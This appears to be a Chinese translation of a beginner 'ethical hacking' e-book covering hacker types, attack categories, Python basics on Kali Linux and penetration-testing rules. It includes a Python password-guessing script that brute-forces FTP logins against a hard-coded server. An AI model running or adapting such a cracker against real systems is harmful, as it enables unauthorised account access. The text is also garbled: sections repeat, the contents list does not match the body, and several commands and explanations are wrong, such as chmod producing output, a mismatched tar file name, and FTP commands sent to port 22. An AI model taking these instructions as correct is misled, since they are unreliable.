  trans: "\n\n# 目录\n- 黑客技术基础\n- 道德黑客的好处\n- 不同类型的黑客攻击\n- 黑客技术：入门指南\n- 第一步——学习更多计算机与网络\n\
    - 第二步——阅读基础黑客书籍\n- 第三步——学习编程\n- 如何使用 Python 进行黑客\n- 如何获取 Python 模块\n- 如何编写 Python\
    \ 脚本\n- 如何运行 Python 文件\n- 如何添加注释\n- 面向对象编程\n- 对象的组成\n- 使用 Python 语言进行网络\n- 字典\n\
    - 控制语句\n- 如何创建一个密码破解器\n- 基础计算机安全\n- 如何对抗恶意程序\n- Web 安全\n- 渗透测试\n- 渗透测试——基础\n-\
    \ 渗透测试的规则\n- 渗透测试——流程\n- 选择你的工具\n- 渗透测试的不同形式\n- 渗透测试的不同侧面\n- 手动与自动测试\n- 如何编写报告\n\
    - 渗透测试的法律层面\n- 如何保护自己\n- 如何保护你的网站免受黑客攻击\n- 典型的黑客攻击\n- 防御措施\n- 如何保持业务安全\n- 结论\n\
    \nCopyright ©2021.DR.PATRICK JEFF 版权所有。未经出版者事先许可，本出版物的任何部分不得以任何形式或通过任何手段复制、分发或传输，包括复印、录制或其他电子或机械方法，但法律允许的批判性评论中的简短引用以及某些其他非商业用途除外。\n\
    \n# 黑客技术基础\n有三种类型的黑客：\n1. 白帽\n2. 黑帽\n3. 灰帽\n\n白帽黑客（也称为道德黑客）试图攻入网络系统，以帮助企业和组织改进其数字防御。同时，黑帽黑客出于恶意目的评估数字记录和设备。灰帽黑客是前两者的结合：他可能有时是白帽，下一刻就变成了黑帽。\n\
    \n重要提示：有法律禁止非法黑客行为。如果你在未经所有者许可的情况下访问数字信息，可能会被关禁。因此，此本书将帮助你成为一名道德黑客。它将为你提供可以在系统中使用的技巧和技术。\n\
    \n# 道德黑客的好处\n要保护自己，你需要像黑客一样思考。这一原则是白帽黑客的核心。黑客的总数正在不断增长，这些人一直在不断提高自己的技能和知识。如果你考虑机器和数字网络中存在的漏洞，你会意识到人们在面对黑客时的安全状况是多么糟糕。你需要保护你的系统免受侵害。为了实现这一点，你应该学会如何攻击。白帽黑客的目标是：\n\
    - 在不破坏系统的情况下进行攻击\n- 识别系统漏洞\n- 证明漏洞的存在\n- 帮助提高其目标的安全性\n\n# 不同类型的黑客攻击\n黑客将攻击分为不同的类型。这些类型包括：\n\
    \n## 非技术性\n这些侧重于终端用户（即使用目标设备的人）。由于人类有信任他人的本能，黑客可以在不使用任何电子工具的情况下突破系统的防御。这些黑客可能会使用“社会工程”策略获取用户的信任，并获得网络或文件的访问。你稍后将学习更多关于社会工程的内容。黑客还可能对目标实施物理攻击。例如，他可能会闯入机房并访问其中的计算机。作为替代方案，他可能会在建筑内翻垃圾，寻找有用信息（例如密码）。黑客将这种方法称为“翻垃圾桶”。\n\
    \n## 网络\n黑客可以很容易实施这种攻击，因为大多数网络可以通过互联网访问。最常见的网络攻击形式是：\n- 使用调制解调器访问网络\n- 利用传输机制漏洞（例如\
    \ NetBIOS）\n- 向网络发送连续请求\n- 操纵系统并收集数据\n\n## 系统\n这些攻击在任何黑客行为中起着重要作用。是因为计算机有操作系统。有很多你可以使用的操作系统。但黑客通常关注最流行的系统（例如\
    \ Windows 系统）。你可以使用的：\n- 破坏文件安全\n- 破解密码\n- 攻击预装认证\n- 利用漏洞\n\n# 黑客技术：入门指南\n第一步——学习更多计算机与网络\n\
    黑客涉及计算机和网络。它需要高级计算机知识和网络技能。显然，如果你甚至不知道 TCP/IP 和 Windows 的区别，就无法攻击计算机。要成为黑客，你必须掌握计算机相关的基础知识。接触不同的操作系统是最好的。越来越多的人转向\
    \ Linux 系统，所以你应该学习该系统的基础。一旦你掌握了计算机和网络的知识，理解漏洞将变得简单。\n\n第二步——阅读基础黑客书籍\n市有很多学习书籍。基础搜索可以为你提供大量的学习材料。但是，如果你是黑客领域的新人，你应该关注黑客的基础和原理。获取如\
    \ Wireshark 或 payload 之类的书籍很重要，但你还需要从这种方法中获益。本书将涵盖黑客的基础。阅读后，你将能够攻击系统并理解数字安全。\n\
    \n第三步——学习编程\n## 如何使用 Python 进行黑客\nPython 是黑客最好的编程语言之一。这种语言简单易学，足以满足你所有的编程需求。在本章中，你将学习\
    \ Python 的基础。你将知道如何启动它、用它编写代码以及如何编译它。重要提示：本章假设你使用的是 Kali Linux，这是一个为黑客创建的操作系统。Kali\
    \ Linux 包含了许多内置黑客工具，你可以用它们测试你的系统或攻击其他网络。此外，该操作系统是完全免费的。\n\n## 如何获取 Python 模块\n\
    使用 Kali Linux 的优点之一是预装了 Python。这意味着你不需要下载任何内容就可以编写代码。Python 的默认模块和语言允许你执行操作。例如，Python\
    \ 异常处理、文件处理、数学和数字。Python 的内置工具和组件已足够创建，但你可以通过添加第三方来源增强这种语言的灵活性。这些额外的模块是许多黑客偏于它而非\
    \ C++ 或 Ruby 的原因。\n\n## 如何编写 Python 脚本\n在书中，你将学习如何使用 Python 语言编写代码。它还会解释 Python\
    \ 代码的基础术语、概念和语法。仔细阅读这些材料；它们将帮助你成为一名知识渊渊的程序员和黑客。重要提示：编写代码时需要使用文本编辑器。Kali Linux\
    \ 内置了一个名为“Leafpad”的文本编辑器。如你所见，Kali Linux 包含了黑客所需的一切。\n\n## 正确格式\n格式在 Python 语言中起着重要作用。Python\
    \ 解释器根据格式对代码分组。记住，一致性比精确更重要。你不需要遵循规则，只需进行格式缩进。如果你使用缩进来区分代码块，请对每行进行缩进。忘记会导致错误。\n\
    \n# 如何运行 Python 文件\n没有过学习。为了帮助你掌握这一点，让我们用 Leafpad 写一段基础代码。\n```python\n#!/usr/bin/python\n\
    name=\"Chuck Norris\"\nprint(\"Hi,\" + name + \"!\")\n```\n这段代码由行组成。第一行触发解释器。第二行创建一个变量\
    \ `name` 并赋值。最后将 \"Hi\" 与用户输入拼接。此时你无法执行代码，你必须赋予自己运行权限。在 Kali 中，你应该使用的命令是：\n```bash\n\
    chmod 755 sample.py\n```\n使用该命令后，你的终端将显示：Hi, Chuck!\n\n# 如何添加注释\n你可以在代码中添加注释。在编程中，注释是定义代码功能的单词、句子或段落。它不会影响代码的功能或行为。给代码添加注释不是强制的，但建议这样做。注释将帮助你记住有关代码的信息。显然，你不想忘记程序的内部机制。Python\
    \ 解释器会跳过每个注释。这意味着解释器将跳过单词、句子或段落，直到找到合法的代码块。在 Python 中，你需要使用 `#` 设置单行注释。对于多行注释，你必须输入三引号。这些符号必须出现在你的开头。以下是用\
    \ Python 语言编写的示例：\n1. `# Hi, I’m a single-line comment.`\n2. `\"\"\"Hi,I’mAMultilineComment\"\
    \"\"`\n\n# 模块\n通过 Python，你可以将代码分成独立的模块。你必须导入模块才能使用它。\n\n# 安装模块\n像其他 Linux 系统一样，Kali\
    \ Linux 在获取新文件或程序时使用 `get`。在下载模块后使用以下命令：`pip install`。要获取此模块，你必须：\n1. 开启你的 Kali\
    \ 电脑。\n2. 启动终端（接收输入的小窗口）。\n3. 遵循代码：\n   `get http://xael.org/normal/python-nmap/python-nmap-0.3.gz`\n\
    4. 输入以下命令提取文件：\n   `tar -xzf nmap-0.3.gz`\n5. 进入创建的目录：\n   `cd nmap-0.3/`\n6.\
    \ 执行以下代码完成：`python install`。你在 Kali 电脑上成功安装了 Python 模块。现在你可以使用该模块进行黑客活动。重要提示：这是你添加到操作系统中的方法。起初可能看起来很长很复杂，但一旦你习惯了，创建大量模块将易如反掌。\n\
    \n# 如何编写 Python 脚本\n在书书中，你将学习如何使用 Python 语言编写代码。它还会解释 Python 代码的基础术语、概念和语法。仔细阅读这些材料；它们将帮助你成为一名优秀的程序员和黑客。重要提示：编写代码时需要使用文本编辑器。Kali\
    \ Linux 内置了一个名为“Leafpad”的文本编辑器。如你所见，Kali Linux 包含了黑客计算机和系统所需的一切。\n\n# 模块\n通过 Python，你可以将代码分成独立的模块。你必须导入模块才能使用它。在导入模块时，你会访问类、方法和函数（你稍后会学习这些）。\n\
    \n# 面向对象编程\n在这一点，讨论面向对象编程是重要的。OOP 是作为主要语言框架的代码模型（例如 Java）。如果你想成为黑客。\n\n## 对象的组成\n\
    对象具有方法（可以执行的操作）和属性（特征）。如果你把 OOP 比作人类语言，对象是动词，属性是形容词。对象属于类。\n\n## 变量\n变量指向计算机中的信息。在\
    \ Python 中，它可以保持不同类型的数据（例如字符串、列表、整数、字典）。变量就像类。启动文本编辑器并输入以下：\n```python\nvariable\
    \ = \"This is an awesome variable.\"\nlist = [10, 20, 30, 40, 50]\ndictionary\
    \ = {'example': 'Hacker', 'number': 23}\n```\n运行该脚本后，你将看到消息：This is an awesome\
    \ variable。重要提示：Python 可以选择正确的变量类型。你不需要在设置值之前声明变量。\n\n# 函数\nPython 语言带有预装函数。Kali\
    \ Linux 拥有丰富的函数集合，尽管你可能从在线库下载更多。以下是在程序中使用的某些函数：\n- Int() – 使用此函数转换数值数据。它提供参数的整数部分。\n\
    - Len() – 此函数计算列表中的项。\n- Exit() – 此函数让你退出程序。\n- Max() – 使用此函数，你可以确定列表的最大值。\n-\
    \ Type() – 使用此函数识别 Python 对象的类型。\n- Float() – 此函数将其参数转换为浮点数。\n- Sorted() – 使用此函数对列表项排序。\n\
    - Range() – 此函数提供两个特定值之间的列表。你需要将这些值设置为函数参数。\n\n# 数组\n数组是不同对象的集合。你可以通过指定索引 [4]\
    \ 获取第四个元素。Python 有类似的功能，但被称为列表。这意味着你可以使用它们进行循环（语句）。\n\n# 控制语句\n控制程序需要代码。在 Python\
    \ 中，你有 if 和 else。要使用此语句，你必须使用以下语法：\n```python\nif user_id == 0:\n    print(\"\
    Hi, you are the root user.\")\nelse:\n    print(\"Hi, you are an ordinary user.\"\
    )\n```\n\n# 循环\n循环是 Python 的另一个强大功能。最流行的循环形式是“for”和“while”。详细讨论每种形式：\n\n### \"\
    for\" 循环\n这种循环从 Python 对象（例如列表）设置数据以持续循环变量。在以下示例中，“for”循环将进入不同的密码：\n```python\n\
    passwords = [\"ftp\", \"sample\", \"user\", \"admin\", \"backup\", \"password\"\
    ]\nfor password in passwords:\n    attempt = connect(username, password)\n```\n\
    \n### \"while\" 循环\nwhile 循环检查布尔语句的值，并在值为“true”时执行代码。记住，布尔语句只有两个可能的值：(1) 真或 (2)\
    \ 假。\n\n# 如何创建一个密码破解器\n此时你已经学会黑黑客是一个程序。要创建一个密码工具，你必须使用 Python。你必须的代码是：\n```python\n\
    #!/usr/bin/python\nimport socket\ndef connect(username, password):\n    sample\
    \ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sample.connect((\"\
    192.168.1.107\", 22))\n    data = sample.recv(1024)\n    sample.send(\"USER \"\
    \ + username + \"\\n\")\n    data = sample.recv(1024)\n    sample.send(\"PASS\
    \ \" + password + \"\\n\")\n    data = sample.recv(3)\n    sample.close()\n  \
    \  return data\n\nusername = \"Sample\"\npasswords = [\"123\", \"ftp\", \"admin\"\
    , \"test\", \"backup\", \"password\"]\nfor password in passwords:\n    attempt\
    \ = connect(username, password)\n    if attempt == \"230\":\n        print(\"\
    password found:\" + password)\n        exit(0)\n```\n将文件保存为 \"password_cracker.py\"\
    。然后，获取执行程序的权限并针对目标服务器运行。重要提示：上述代码不是固定的。你可以根据自己的喜好或情况进行修改。一旦你成为熟练的 Python 程序员，你将提高这个密码破解器的灵活性效率。\n\
    \n# 渗透测试——流程\n以下是渗透测试涉及的详细描述：\n- 选择你的工具\n- 渗透测试的不同形式\n- 手动与自动测试\n- 如何编写报告\n- 渗透测试的法律层面\n\
    - 如何保护自己\n- 如何保护你的网站免受黑客攻击\n\n# 渗透测试的规则\n记住，渗透测试与恶意黑客之间存在界限。为了确保你不会“越过”黑暗面，请遵循这些简单规则：\n\
    关注伦理：你应该以专业的态度工作。考虑你的道德和个人原则。无论你是攻击自己的计算机还是测试别人都一样。重要提示：有法律禁止黑客行为。如果你在未经所有者许可的情况下访问数字信息，可能会被关禁。\n\
    \n# 渗透测试的不同形式\n你进行的测试形式取决于客户的需求。\n\n## 非技术性\n侧重于终端用户（即使用目标设备的人）。由于人类有信任他人的本能，黑客可以在不使用任何电子工具的情况下突破系统的防御。这些黑客可能会使用“社会工程”策略获取用户的信任，并获得网络或文件的访问。你稍后将学习更多关于社会工程的内容。黑客还可能对目标实施物理攻击。例如，他可能会闯入机房并访问其中的计算机。作为替代方案，他可能会在建筑内翻垃圾，寻找有用信息（例如密码）。黑客将这种方法称为“翻垃圾桶”。\n\
    \n## 网络\n黑客可以很容易实施这种攻击，因为大多数网络可以通过互联网访问。最常见的网络攻击形式是：\n- 使用调制调器访问网络\n- 利用传输机制漏洞（例如\
    \ NetBIOS）\n- 向网络发送连续请求\n- 操纵系统并收集数据\n\n## 系统\n这些攻击在任何黑客行为中起着重要作用。是因为计算机有操作系统。有很多你可以使用的操作系统。但黑客通常关注最流行的系统（例如\
    \ Windows 系统）。你可以使用的：\n- 破坏文件安全\n- 破解密码\n- 攻击预装认证\n- 利用漏洞\n\n# 渗透测试——流程\n以下是渗透测试涉及的详细描述：\n\
    - 安全权限：不要在目标上做任何事情，直到你获得客户的许可。此文档可以保护你免受诉讼或类似问题。执行攻击时，授权是不够的。\n\n"
